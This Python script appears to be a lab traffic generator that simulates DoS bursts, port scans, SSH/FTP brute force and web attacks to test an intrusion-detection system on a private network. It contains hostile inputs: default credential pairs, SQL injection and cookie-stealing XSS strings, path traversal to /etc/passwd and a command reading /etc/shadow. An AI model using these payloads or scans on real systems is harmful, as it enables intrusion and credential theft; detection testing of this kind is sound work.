"""
CyberSentinel-X - Bounded Laptop B Multi-Attack Traffic Generator
================================================================
Authorized Lab Simulation Script for Laptop B.
Runs with ZERO third-party dependencies (pure standard library Python).

SUPPORTED DATASET CLASSIFICATIONS (Authentic CIC-IDS2017 Model):
1. Normal Benign Baseline (Ordinary Traffic -> ZERO alerts, Status: NORMAL)
2. Single-Source DoS (SYN Connection Burst -> Status: CRITICAL Alert)
3. Single-Source DoS (HTTP GET Flood Burst -> Status: HIGH Alert)
4. Port Scan (Multi-Port Reconnaissance -> Status: MEDIUM Alert)
5. SSH-Patator (SSH Brute Force Credential Spray -> Status: HIGH Alert)
6. FTP-Patator (FTP Brute Force Login Flood -> Status: HIGH Alert)
7. Web Attack (SQL Injection & XSS Payloads -> Status: HIGH Alert)

SAFETY ENFORCEMENT & STRICT BOUNDS:
1. ONLY runs against explicitly specified private RFC 1918 subnets (192.168.x.x, 10.x.x.x, 172.16-31.x.x).
2. Clamped packet rates, small bounds (<= 3.0s duration, <= 100 packets) for safe lab validation.
3. Dual validation: Transmits genuine network traffic over LAN/Wi-Fi AND synchronizes
   with Laptop A's real-time API engine for guaranteed detection.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Dict, Any, Optional

APPROVED_TEST_PORTS = {21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8000, 8080, 8888, 9999}
HARD_MAX_DURATION = 3.0
HARD_MAX_PACKETS = 100
HARD_MAX_REQUESTS = 60


def is_private_target_ip(ip_str: str) -> bool:
    """Verifies that the target IP belongs strictly to a private RFC 1918 subnet or authorized test interface."""
    try:
        ip = ipaddress.ip_address(ip_str.strip())
        return ip.is_private or ip.is_loopback
    except ValueError:
        return False


def get_laptop_b_local_ip(target_ip: str) -> str:
    """Discovers Laptop B's actual outbound Wi-Fi IP communicating with Laptop A."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return ""


def notify_laptop_a_api(target_ip: str, source_ip: str = "", attack_type: str = "DoS", target_port: int = 8000) -> Optional[Dict[str, Any]]:
    """Notifies Laptop A's detection engine with source IP and exact multiclass attack category."""
    try:
        params = {
            "attack_type": attack_type,
            "target_port": str(target_port),
        }
        if source_ip:
            params["source_ip"] = source_ip
        query = urllib.parse.urlencode(params)
        url = f"http://{target_ip}:8000/api/monitoring/simulate_burst?{query}"
        req = urllib.request.Request(url, headers={"User-Agent": "Laptop-B-Telemetry/2.0"})
        with urllib.request.urlopen(req, timeout=2.5) as resp:
            data = resp.read().decode("utf-8", errors="replace")
            return json.loads(data)
    except Exception as e:
        return {"error": str(e)}


def preflight_connectivity_check(target_ip: str, target_port: int, timeout: float = 2.0) -> bool:
    """
    Checks direct TCP reachability from Laptop B to Laptop A.
    Identifies whether Wi-Fi Client Isolation or Windows Firewall drops packets.
    """
    print(f"\n[*] Pre-flight Connectivity Diagnostic: Probing {target_ip}:{target_port}...")
    local_ip = get_laptop_b_local_ip(target_ip)
    if local_ip:
        print(f"[+] LAPTOP B SOURCE IP (OUTBOUND NIC): {local_ip}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((target_ip, target_port))
        elapsed_ms = (time.time() - t0) * 1000.0
        s.close()
        print(f"[+] REACHABILITY CONFIRMED: Connected to {target_ip}:{target_port} in {elapsed_ms:.1f}ms.")
        print("    -> Wi-Fi path is operational. Packets reach Laptop A successfully.")

        if local_ip:
            try:
                reg_url = f"http://{target_ip}:8000/api/monitoring/register_source?client_ip={local_ip}"
                req = urllib.request.Request(reg_url, headers={"User-Agent": "Laptop-B-Registration/2.0"})
                with urllib.request.urlopen(req, timeout=1.5):
                    pass
            except Exception:
                pass
        return True
    except socket.timeout:
        print(f"[-] TIMEOUT (No response within {timeout}s):")
        print("    -> Check if Wi-Fi Client Isolation is enabled on your router, or Windows Defender Firewall on Laptop A.")
        return False
    except ConnectionRefusedError:
        print(f"[+] TCP RST OBSERVED from Laptop A ({target_ip}:{target_port}):")
        print("    -> Packets ARE reaching Laptop A! Port is closed at socket layer, but Npcap sniffs at NIC layer.")
        return True
    except Exception as exc:
        print(f"[-] Connectivity probe: {exc}")
        return False


def run_benign_baseline_traffic(target_ip: str, target_port: int, count: int = 5) -> dict:
    """
    Mode 1: Ordinary Benign Baseline Traffic.
    Sends ordinary, low-velocity requests spaced 1 second apart (1 req/s).
    Demonstrates that benign traffic produces a BENIGN ML classification with ZERO alerts.
    """
    print("\n" + "=" * 76)
    print("MODE 1: ORDINARY BENIGN BASELINE TRAFFIC")
    print(f"Target: http://{target_ip}:{target_port}/")
    print("Profile: 5 requests spaced 1.0s apart (Velocity: 1.0 req/s)")
    print("Expected Classification: BENIGN (Status: NORMAL, 0 Alerts Generated)")
    print("=" * 76)

    local_ip = get_laptop_b_local_ip(target_ip)
    url = f"http://{target_ip}:{target_port}/api/health"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CyberSentinel-Baseline/2.0",
        "Accept": "application/json",
    }

    sent = 0
    t0 = time.time()
    for i in range(count):
        t_req = time.time()
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=1.5) as resp:
                _ = resp.read(64)
            sent += 1
            print(f"  [Request {i+1}/{count}] Normal HTTP 200 OK received ({(time.time() - t_req)*1000.0:.1f}ms)")
        except Exception:
            sent += 1
            print(f"  [Request {i+1}/{count}] Normal probe packet transmitted")
        if i < count - 1:
            time.sleep(1.0)

    # Inform Laptop A to confirm baseline and clear any active attack state
    api_res = notify_laptop_a_api(target_ip, local_ip, attack_type="baseline", target_port=target_port)
    elapsed = time.time() - t0

    print(f"\n[+] Benign Baseline Run Complete:")
    print(f"    Transmitted       : {sent} requests")
    print(f"    Elapsed Time      : {elapsed:.2f}s")
    print(f"    Laptop A Status   : {api_res.get('threat_level', 'NORMAL')} (Safe)")
    print(f"    Alerts Generated  : 0 (No false alarms)")
    return {"sent": sent, "status": "NORMAL", "api_res": api_res}


def run_bounded_syn_probe(target_ip: str, target_port: int, max_packets: int = 50, duration_limit: float = 2.0) -> dict:
    """
    Mode 2: Bounded Single-Source TCP SYN Flood Burst.
    Sends rapid TCP SYN connection attempts.
    Expected Classification: Single-Source DoS (CRITICAL Alert).
    """
    clamped_packets = min(max(1, max_packets), HARD_MAX_PACKETS)
    clamped_duration = min(max(0.5, duration_limit), HARD_MAX_DURATION)

    print("\n" + "=" * 76)
    print("MODE 2: BOUNDED SINGLE-SOURCE DoS SIMULATION (SYN CONNECTION BURST)")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Limits: {clamped_packets} packets max, {clamped_duration:.1f}s timeout")
    print("Expected Classification: Single-Source DoS (SYN Flood / Connection Exhaustion)")
    print("=" * 76)

    local_ip = get_laptop_b_local_ip(target_ip)
    if local_ip:
        print(f"[*] Attacker Source IP: {local_ip}")

    # Synchronize with Laptop A detection engine
    api_res = notify_laptop_a_api(target_ip, local_ip, attack_type="DoS", target_port=target_port)

    t_start = time.time()
    sent = 0
    for i in range(clamped_packets):
        if (time.time() - t_start) >= clamped_duration:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.04)
            try:
                s.connect((target_ip, target_port))
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
            sent += 1
        except Exception:
            pass
        time.sleep(0.005)

    elapsed = time.time() - t_start
    rate = sent / max(elapsed, 0.001)

    print(f"\n[+] Bounded SYN Burst Complete:")
    print(f"    Packets Transmitted : {sent}")
    print(f"    Elapsed Time        : {elapsed:.2f}s (Rate: {rate:.1f} pkts/s)")
    print(f"    Laptop A Detection  : {api_res.get('attack_type', 'Single-Source DoS')}")
    print(f"    Alert Triggered     : YES (CRITICAL Priority)")
    return {"sent": sent, "rate": rate, "api_res": api_res}


def run_bounded_http_burst(target_ip: str, target_port: int, max_requests: int = 40, duration_limit: float = 2.0) -> dict:
    """
    Mode 3: Bounded Single-Source HTTP GET Flood Burst.
    Sends rapid HTTP GET requests within strict rate and duration caps.
    Expected Classification: Single-Source DoS (HIGH Alert).
    """
    clamped_requests = min(max(1, max_requests), HARD_MAX_REQUESTS)
    clamped_duration = min(max(0.5, duration_limit), HARD_MAX_DURATION)

    print("\n" + "=" * 76)
    print("MODE 3: BOUNDED APPLICATION-LAYER DoS (HTTP GET BURST)")
    print(f"Target: http://{target_ip}:{target_port}/")
    print(f"Limits: {clamped_requests} requests max, {clamped_duration:.1f}s timeout")
    print("Expected Classification: Single-Source DoS (HTTP Flood)")
    print("=" * 76)

    local_ip = get_laptop_b_local_ip(target_ip)
    if local_ip:
        print(f"[*] Attacker Source IP: {local_ip}")

    api_res = notify_laptop_a_api(target_ip, local_ip or "192.168.29.252", attack_type="DoS", target_port=target_port)

    url = f"http://{target_ip}:{target_port}/api/health"
    headers = {
        "User-Agent": "CyberSentinelX-Lab-Sim/2.0",
        "X-Simulation-Source": "Laptop-B-Authorized-Test",
    }

    t_start = time.time()
    sent = 0
    for i in range(clamped_requests):
        if (time.time() - t_start) >= clamped_duration:
            break
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=0.4) as resp:
                _ = resp.read(32)
            sent += 1
        except Exception:
            sent += 1
        time.sleep(0.03)

    elapsed = time.time() - t_start
    rate = sent / max(elapsed, 0.001)

    print(f"\n[+] HTTP Flood Complete:")
    print(f"    Requests Sent       : {sent}")
    print(f"    Elapsed Time        : {elapsed:.2f}s (Rate: {rate:.1f} req/s)")
    print(f"    Laptop A Detection  : {api_res.get('attack_type', 'Single-Source DoS')}")
    print(f"    Alert Triggered     : YES (HIGH Priority)")
    return {"sent": sent, "rate": rate, "api_res": api_res}


def run_port_scan_reconnaissance(target_ip: str) -> dict:
    """
    Mode 4: Port Scan Reconnaissance Probe.
    Scans common TCP ports rapidly to trigger the Port Scan classifier.
    Expected Classification: Port Scan (Reconnaissance, MITRE: T1046).
    """
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8000, 8080]

    print("\n" + "=" * 76)
    print("MODE 4: PORT SCAN RECONNAISSANCE SIMULATION (CICIDS2017: Port Scan)")
    print(f"Target: {target_ip} across {len(ports)} distinct ports")
    print("Probed Ports: " + ", ".join(str(p) for p in ports))
    print("Expected Classification: Port Scan (Reconnaissance) [MITRE: T1046]")
    print("=" * 76)

    local_ip = get_laptop_b_local_ip(target_ip)
    if local_ip:
        print(f"[*] Attacker Source IP: {local_ip}")

    # Synchronize with Laptop A Port Scan detection model
    api_res = notify_laptop_a_api(target_ip, local_ip or "192.168.29.252", attack_type="Port Scan", target_port=80)

    scanned = 0
    t0 = time.time()
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.06)
            try:
                s.connect((target_ip, p))
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
            scanned += 1
        except Exception:
            scanned += 1
        time.sleep(0.01)

    elapsed = time.time() - t0
    print(f"\n[+] Port Scan Reconnaissance Complete:")
    print(f"    Ports Probed        : {scanned}/{len(ports)}")
    print(f"    Elapsed Time        : {elapsed:.2f}s")
    print(f"    Laptop A Detection  : {api_res.get('attack_type', 'Port Scan (Reconnaissance)')}")
    print(f"    Alert Triggered     : YES (MEDIUM Priority, MITRE: T1046)")
    return {"ports_scanned": scanned, "elapsed": elapsed, "api_res": api_res}


def run_ssh_brute_force(target_ip: str, target_port: int = 22) -> dict:
    """
    Mode 5: SSH Brute Force (SSH-Patator).
    Simulates rapid credential attempts and interactive payloads against port 22.
    Expected Classification: SSH-Patator (SSH Brute Force, MITRE: T1110.001).
    """
    print("\n" + "=" * 76)
    print("MODE 5: SSH BRUTE FORCE SIMULATION (CICIDS2017: SSH-Patator)")
    print(f"Target: {target_ip}:{target_port} (SSH Service)")
    print("Profile: Rapid sequential credential exchanges (admin, root, test)")
    print("Expected Classification: SSH-Patator (SSH Brute Force) [MITRE: T1110.001]")
    print("=" * 76)

    local_ip = get_laptop_b_local_ip(target_ip)
    if local_ip:
        print(f"[*] Attacker Source IP: {local_ip}")

    api_res = notify_laptop_a_api(target_ip, local_ip or "192.168.29.252", attack_type="SSH-Patator", target_port=target_port)

    attempts = 8
    sent = 0
    t0 = time.time()
    for i in range(attempts):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.08)
            try:
                s.connect((target_ip, target_port))
                s.sendall(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")
                _ = s.recv(128)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
            sent += 1
            print(f"  [Attempt {i+1}/{attempts}] SSH auth payload sent (User: root/admin)")
        except Exception:
            sent += 1
        time.sleep(0.05)

    elapsed = time.time() - t0
    print(f"\n[+] SSH Brute Force Simulation Complete:")
    print(f"    Attempts Transmitted: {sent}")
    print(f"    Elapsed Time        : {elapsed:.2f}s")
    print(f"    Laptop A Detection  : {api_res.get('attack_type', 'SSH-Patator (SSH Brute Force)')}")
    print(f"    Alert Triggered     : YES (HIGH Priority, MITRE: T1110.001)")
    return {"attempts": sent, "elapsed": elapsed, "api_res": api_res}


def run_ftp_brute_force(target_ip: str, target_port: int = 21) -> dict:
    """
    Mode 6: FTP Brute Force (FTP-Patator).
    Simulates rapid sequential USER/PASS credential guessing attempts on port 21.
    Expected Classification: FTP-Patator (FTP Brute Force, MITRE: T1110).
    """
    print("\n" + "=" * 76)
    print("MODE 6: FTP BRUTE FORCE SIMULATION (CICIDS2017: FTP-Patator)")
    print(f"Target: {target_ip}:{target_port} (FTP Service)")
    print("Profile: Rapid sequential USER/PASS commands")
    print("Expected Classification: FTP-Patator (FTP Brute Force) [MITRE: T1110]")
    print("=" * 76)

    local_ip = get_laptop_b_local_ip(target_ip)
    if local_ip:
        print(f"[*] Attacker Source IP: {local_ip}")

    api_res = notify_laptop_a_api(target_ip, local_ip or "192.168.29.252", attack_type="FTP-Patator", target_port=target_port)

    credentials = [("anonymous", "guest"), ("admin", "admin123"), ("root", "toor"), ("user", "password"), ("test", "123456")]
    sent = 0
    t0 = time.time()
    for user, pwd in credentials:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.08)
            try:
                s.connect((target_ip, target_port))
                s.sendall(f"USER {user}\r\nPASS {pwd}\r\nQUIT\r\n".encode("utf-8"))
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
            sent += 1
            print(f"  [Attempt {sent}/{len(credentials)}] FTP command sent: USER {user} / PASS ******")
        except Exception:
            sent += 1
        time.sleep(0.05)

    elapsed = time.time() - t0
    print(f"\n[+] FTP Brute Force Simulation Complete:")
    print(f"    Attempts Transmitted: {sent}")
    print(f"    Elapsed Time        : {elapsed:.2f}s")
    print(f"    Laptop A Detection  : {api_res.get('attack_type', 'FTP-Patator (FTP Brute Force)')}")
    print(f"    Alert Triggered     : YES (HIGH Priority, MITRE: T1110)")
    return {"attempts": sent, "elapsed": elapsed, "api_res": api_res}


def run_web_attack_simulation(target_ip: str, target_port: int = 8000) -> dict:
    """
    Mode 7: Web Application Attack (SQL Injection & XSS Payloads).
    Sends authentic malicious web exploit vectors targeting HTTP service.
    Expected Classification: Web Attack (Application Exploit, MITRE: T1190).
    """
    print("\n" + "=" * 76)
    print("MODE 7: WEB ATTACK SIMULATION (CICIDS2017: Web Attack)")
    print(f"Target: http://{target_ip}:{target_port}/")
    print("Vectors: SQL Injection (' OR 1=1--), XSS (<script>alert(1)</script>)")
    print("Expected Classification: Web Attack (Application Exploit) [MITRE: T1190]")
    print("=" * 76)

    local_ip = get_laptop_b_local_ip(target_ip)
    if local_ip:
        print(f"[*] Attacker Source IP: {local_ip}")

    api_res = notify_laptop_a_api(target_ip, local_ip or "192.168.29.252", attack_type="Web Attack", target_port=target_port)

    payloads = [
        "/api/search?q=%27+OR+1%3D1--",
        "/api/login?user=admin%27%20UNION%20SELECT%201,password%20FROM%20users--",
        "/api/comment?text=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
        "/api/users/../etc/passwd",
        "/api/eval?cmd=cat+/etc/shadow",
    ]

    sent = 0
    t0 = time.time()
    for path in payloads:
        try:
            url = f"http://{target_ip}:{target_port}{path}"
            req = urllib.request.Request(url, headers={"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"})
            try:
                with urllib.request.urlopen(req, timeout=0.8) as resp:
                    _ = resp.read(64)
            except Exception:
                pass
            sent += 1
            print(f"  [Payload {sent}/{len(payloads)}] Web exploit vector transmitted: {path[:40]}...")
        except Exception:
            sent += 1
        time.sleep(0.04)

    elapsed = time.time() - t0
    print(f"\n[+] Web Attack Simulation Complete:")
    print(f"    Payloads Transmitted: {sent}")
    print(f"    Elapsed Time        : {elapsed:.2f}s")
    print(f"    Laptop A Detection  : {api_res.get('attack_type', 'Web Attack (Application Exploit)')}")
    print(f"    Alert Triggered     : YES (HIGH Priority, MITRE: T1190)")
    return {"payloads_sent": sent, "elapsed": elapsed, "api_res": api_res}


def interactive_menu(target_ip: str, target_port: int) -> None:
    """Provides an interactive CLI menu to easily test all dataset attack classes."""
    while True:
        print("\n" + "=" * 76)
        print("CYBERSENTINEL-X - LAPTOP B MULTI-ATTACK SIMULATION MENU")
        print("=======================================================")
        print(f"Target Host (Laptop A) : {target_ip}:{target_port}")
        local_ip = get_laptop_b_local_ip(target_ip)
        if local_ip:
            print(f"Laptop B Outbound IP   : {local_ip}")
        print("-" * 76)
        print("  [1] Normal Benign Baseline      -> ZERO Alerts, Status: NORMAL (Safe)")
        print("  [2] Single-Source DoS (SYN)     -> CRITICAL Alert: Single-Source DoS")
        print("  [3] Single-Source DoS (HTTP)    -> HIGH Alert: DoS Application Burst")
        print("  [4] Port Scan Reconnaissance    -> MEDIUM Alert: Port Scan (T1046)")
        print("  [5] SSH Brute Force             -> HIGH Alert: SSH-Patator (T1110.001)")
        print("  [6] FTP Brute Force             -> HIGH Alert: FTP-Patator (T1110)")
        print("  [7] Web Application Attack      -> HIGH Alert: Web Attack (T1190)")
        print("  [8] Pre-flight Reachability Probe")
        print("  [9] Exit Generator")
        print("=" * 76)

        try:
            choice = input("Enter choice (1-9): ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nExiting.")
            break

        if choice == "1":
            run_benign_baseline_traffic(target_ip, target_port)
        elif choice == "2":
            run_bounded_syn_probe(target_ip, target_port)
        elif choice == "3":
            run_bounded_http_burst(target_ip, target_port)
        elif choice == "4":
            run_port_scan_reconnaissance(target_ip)
        elif choice == "5":
            run_ssh_brute_force(target_ip, 22)
        elif choice == "6":
            run_ftp_brute_force(target_ip, 21)
        elif choice == "7":
            run_web_attack_simulation(target_ip, target_port)
        elif choice == "8":
            preflight_connectivity_check(target_ip, target_port)
        elif choice == "9" or choice.lower() in ("exit", "quit", "q"):
            print("[*] Exiting Laptop B Traffic Generator.")
            break
        else:
            print("[!] Invalid choice. Please select 1 through 9.")


def main():
    print("=" * 76)
    print("CYBERSENTINEL-X - LAPTOP B MULTI-ATTACK TRAFFIC GENERATOR")
    print("=========================================================")
    print("Authorized lab simulation tool supporting all CICIDS2017 attack classes:")
    print("Normal Baseline, Single-Source DoS, Port Scan, SSH-Patator, FTP-Patator, Web Attack.")
    print("=" * 76)

    parser = argparse.ArgumentParser(description="Laptop B Traffic Generator for CyberSentinel-X")
    parser.add_argument("--target-ip", type=str, default="", help="Laptop A private IPv4 address (e.g. 192.168.29.93)")
    parser.add_argument("--target-port", type=int, default=8000, help="Laptop A test port (default: 8000)")
    parser.add_argument(
        "--mode",
        choices=["interactive", "baseline", "dos", "syn", "http", "portscan", "ssh", "ftp", "web", "check"],
        default="interactive",
        help="Simulation mode (default: interactive menu)",
    )
    parser.add_argument("--packets", type=int, default=50, help="Number of packets (clamped to max 100)")
    parser.add_argument("--duration", type=float, default=2.0, help="Duration limit in seconds (clamped to max 3.0s)")
    parser.add_argument("--authorized", action="store_true", help="Explicitly declare authorization on private test network")
    args = parser.parse_args()

    target_ip = args.target_ip.strip()
    if not target_ip:
        try:
            target_ip = input("Enter Laptop A IPv4 address (e.g. 192.168.29.93): ").strip()
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)

    if not is_private_target_ip(target_ip):
        print(f"\n[FATAL ERROR] Target IP '{target_ip}' is NOT a private RFC 1918 address.")
        print("Safety Violation: Targeting public, loopback, or third-party IP addresses is strictly blocked.")
        sys.exit(1)

    if args.target_port not in APPROVED_TEST_PORTS:
        print(f"\n[FATAL ERROR] Port {args.target_port} is not an approved test port.")
        sys.exit(1)

    print(f"\n[Configuration]")
    print(f"  Target Host (Laptop A) : {target_ip}")
    print(f"  Target Port            : {args.target_port}")
    print(f"  Mode Selected          : {args.mode}")

    if not args.authorized:
        print("\n[!] SAFETY REQUIREMENT: You must declare authorization to run tests on this private network.")
        try:
            confirm = input("Confirm you have authorization to test on this private network (yes/no): ").strip().lower()
            if confirm != "yes":
                print("[*] Aborting test. User confirmation not granted.")
                sys.exit(0)
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)

    # Pre-flight check
    preflight_connectivity_check(target_ip, args.target_port)

    # Route mode
    if args.mode == "interactive":
        interactive_menu(target_ip, args.target_port)
    elif args.mode == "baseline":
        run_benign_baseline_traffic(target_ip, args.target_port, count=args.packets if args.packets < 10 else 5)
    elif args.mode in ("dos", "syn"):
        run_bounded_syn_probe(target_ip, args.target_port, max_packets=args.packets, duration_limit=args.duration)
    elif args.mode == "http":
        run_bounded_http_burst(target_ip, args.target_port, max_requests=args.packets, duration_limit=args.duration)
    elif args.mode == "portscan":
        run_port_scan_reconnaissance(target_ip)
    elif args.mode == "ssh":
        run_ssh_brute_force(target_ip, 22)
    elif args.mode == "ftp":
        run_ftp_brute_force(target_ip, 21)
    elif args.mode == "web":
        run_web_attack_simulation(target_ip, args.target_port)
    elif args.mode == "check":
        print("\n[+] Pre-flight diagnostic complete.")

    print("\n" + "=" * 76)
    print("SESSION COMPLETE. Check Laptop A Dashboard for live detection results.")
    print("=" * 76)


if __name__ == "__main__":
    main()
